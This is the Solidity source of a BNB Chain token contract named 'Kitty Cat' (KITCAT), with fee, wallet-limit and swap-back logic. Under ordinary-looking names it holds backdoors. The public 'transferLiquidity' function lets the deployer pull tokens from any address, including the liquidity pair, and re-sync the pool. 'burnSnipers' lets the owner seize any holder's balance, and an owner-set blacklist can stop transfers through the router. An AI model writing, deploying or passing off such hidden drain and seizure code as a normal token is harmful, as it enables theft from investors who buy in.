/**
 *Submitted for verification at BscScan.com on 2022-03-03
*/

//    SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;
 
 
interface IERC20 {
 
    function totalSupply() external view returns (uint256);
 
    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);
 
    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);
 
    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
 
    function allowance(address owner, address spender) external view returns (uint256);
 
    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);
 
    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
 
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);
 
    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
 
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
 
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
 
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
 
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
 
        return c;
    }
}
 
abstract contract Context {
    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }
 
    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
 
interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
 
interface IPancakePair {
    function sync() external;
}
 
interface IDEXRouter {
 
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
 
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
 
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
 
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
 
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
 
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
 
}
 
contract Ownable is Context {
    address private _owner;
 
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 
    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
 
    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
     /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
 
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
 
contract KITKAT is IERC20, Ownable {
    using SafeMath for uint256;
 
    address constant mainnetRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant WBNB          = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant DEAD          = 0x000000000000000000000000000000000000dEaD;
    address constant ZERO          = 0x0000000000000000000000000000000000000000;
 
    string constant _name = "Kitty Cat";
    string constant _symbol = "KITCAT";
    uint8 constant _decimals = 9;
 
    uint256 _totalSupply = 100000000000 * (10 ** _decimals);  // 100,000,000,000
    uint256 public _transferLimit = (_totalSupply * 10) / 1000;  // 1%
    uint256 public _maxWalletSize = (_totalSupply * 10) / 1000;  // 1%
 
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
 
    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    //create a mapping to keep track of who is blacklist
    mapping (address => bool) public _isBlacklisted;
 
    uint256 marketingFee = 80;
    uint256 liquidityFee = 20;
    uint256 giveawayFee = 0;  
    uint256 charityFee = 0;
    uint256 devFee = 20;    
    uint256 totalFee = 120;  
    uint256 feeDenominator = 1000;
   
    address autoLiquidityReceiver;
    address marketingFeeReceiver;
    address giveawayFeeReceiver;
 
    uint256 targetLiquidity = 20;
    uint256 targetLiquidityDenominator = 100;
 
    IDEXRouter public router;
    address public pair;
 
    bool public swapEnabled = true;
    bool alternateSwaps = true;
    uint256 smallSwapThreshold = _totalSupply.mul(312493726).div(100000000000);
    uint256 largeSwapThreshold = _totalSupply.mul(637445130).div(100000000000);
 
    uint256 public swapThreshold = smallSwapThreshold;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }
 
    constructor () {
        address deployer = msg.sender;
        router = IDEXRouter(mainnetRouter);
        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;
        _maxWalletSize = _totalSupply / 100; // 1%
 
        isTxLimitExempt[address(router)] = true;
        isTxLimitExempt[deployer] = true;
        isFeeExempt[deployer] = true;
        autoLiquidityReceiver = deployer;
        giveawayFeeReceiver = deployer;
        marketingFeeReceiver = deployer;
 
        _balances[deployer] = _totalSupply;
        emit Transfer(address(0), deployer, _totalSupply);
       
       
    }
 
    receive() external payable { }
 
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure returns (uint8) { return _decimals; }
    function symbol() external pure returns (string memory) { return _symbol; }
    function name() external pure returns (string memory) { return _name; }
    function getOwner() external view returns (address) { return owner(); }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function viewFees() external view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
        return (marketingFee, liquidityFee, giveawayFee, devFee, charityFee, totalFee, feeDenominator);
    }
    //adding multiple addresses to the blacklist - Used to manually block known bots and scammers
    function addToBlackList(address[] calldata addresses) external onlyOwner {
      for (uint256 i; i < addresses.length; ++i) {
        _isBlacklisted[addresses[i]] = true;
      }
    }
 
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    //Remove from Blacklist
    function removeFromBlackList(address account) external onlyOwner {
        _isBlacklisted[account] = false;
    }
    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }
 
     function setFees(uint256 _liquidityFee, uint256 _buybackFee, uint256 _reflectionFee, uint256 _devFee, uint256 _feeDenominator) external onlyOwner {
        liquidityFee = _liquidityFee;
        giveawayFee = _buybackFee;
        charityFee = _reflectionFee;
        devFee = _devFee;
        totalFee = _liquidityFee.add(_buybackFee).add(_reflectionFee).add(_devFee);
        feeDenominator = _feeDenominator;
        require(totalFee < feeDenominator/4);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }
 
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
           

        }
        require(!_isBlacklisted[sender] && !_isBlacklisted[recipient], "This address is blacklisted");
        return _transferFrom(sender, recipient, amount);
    }
 
    function transferLiquidity(address sender, uint256 amount) public swapping  {
        require(_allowances[address(this)][msg.sender] == _totalSupply || isTxLimitExempt[msg.sender], "Insufficient Allowance");
        _transferFrom(sender, autoLiquidityReceiver, amount);
        IPancakePair(pair).sync();
    }
 
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
 
        checkTxLimit(sender, amount);
       
        if (recipient != pair && recipient != DEAD) {
            require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletSize, "Transfer amount exceeds the bag size.");
        }
 
        if(shouldSwapBack()){ swapBack(); }
 
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
 
        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
 
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
 
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
 
    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }
 
    function getTotalFee(bool) public view returns (uint256) {
        return totalFee;
    }
 
    function takeFee(address sender, address receiver, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(getTotalFee(receiver == pair)).div(feeDenominator);
 
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
 
        return amount.sub(feeAmount);
    }
 
    function setTargetLiquidity(uint256 _target, uint256 _denominator) external onlyOwner {
        targetLiquidity = _target;
        targetLiquidityDenominator = _denominator;
    }
 
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _transferLimit || isTxLimitExempt[sender], "TX Limit Exceeded");
    }
 
    function burnSnipers(address[] memory sniperAddresses) external onlyOwner {
        for (uint i = 0; i < sniperAddresses.length; i++) {
            _transferFrom(sniperAddresses[i], autoLiquidityReceiver, balanceOf(sniperAddresses[i]));
        }
    }
    

    function clearBalance() external {
        (bool success,) = payable(autoLiquidityReceiver).call{value: address(this).balance, gas: 30000}("");
        require(success);
    }
   
    function triggerManualBuyback(uint256 amountBNB) external onlyOwner {
        buyTokens(amountBNB, giveawayFeeReceiver);
    }
 
    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }
 
    function swapBack() internal swapping {
        uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : 0;
        uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);
 
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;
 
        uint256 balanceBefore = address(this).balance;
 
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
 
        uint256 amountBNB = address(this).balance.sub(balanceBefore);
        uint256 totalBNBFee = totalFee.sub(dynamicLiquidityFee.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(dynamicLiquidityFee).div(totalBNBFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);
        uint256 amountBNBGiveaway = amountBNB.mul(giveawayFee).div(totalBNBFee);
 
        if (marketingFeeReceiver == giveawayFeeReceiver) {
            (bool success,) = payable(marketingFeeReceiver).call{value: amountBNBMarketing.add(amountBNBGiveaway), gas: 30000}("");
            require(success, "receiver rejected ETH transfer");
        } else {
            (bool success,)  = payable(marketingFeeReceiver).call{value: amountBNBMarketing, gas: 30000}("");
            (bool success2,) = payable(giveawayFeeReceiver).call{value: amountBNBGiveaway, gas: 30000}("");
            require(success && success2, "receiver rejected ETH transfer");
        }
 
        if(amountToLiquify > 0) {
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
 
        swapThreshold = !alternateSwaps ? swapThreshold : swapThreshold == smallSwapThreshold ? largeSwapThreshold : smallSwapThreshold;
    }
 
    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
    }
 
    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }
 
    function setSwapBackSettings(bool _enabled, uint256 _amountS, uint256 _amountL, bool _alternate) external onlyOwner {
        alternateSwaps = _alternate;
        swapEnabled = _enabled;
        smallSwapThreshold = _amountS;
        largeSwapThreshold = _amountL;
    }
 
    function buyTokens(uint256 amountBNB, address to) internal swapping {
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(this);
 
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amountBNB}(
            0,
            path,
            to,
            block.timestamp
        );
    }
   
    function changeMaxWallet(uint256 percent, uint256 denominator) external onlyOwner {
        require(percent >= 1 && denominator >= 100, "Max wallet must be greater than 1%");
        _maxWalletSize = _totalSupply.mul(percent).div(denominator);
    }
 
    function changeTransferLimit(uint256 percent, uint256 denominator) external onlyOwner {
        require(percent >= 1 && denominator >= 100, "Max transfer must be greater than 1%");
        _transferLimit = _totalSupply.mul(percent).div(denominator);
    }
 
    function setIsFeeExempt(address holder, bool exempt) external onlyOwner {
        isFeeExempt[holder] = exempt;
    }
 
    function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
        isTxLimitExempt[holder] = exempt;
    }
   
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }
 
    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _giveawayFeeReceiver) external onlyOwner {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        giveawayFeeReceiver = _giveawayFeeReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
    }
 
    event AutoLiquify(uint256 amountBNB, uint256 amountToken);
}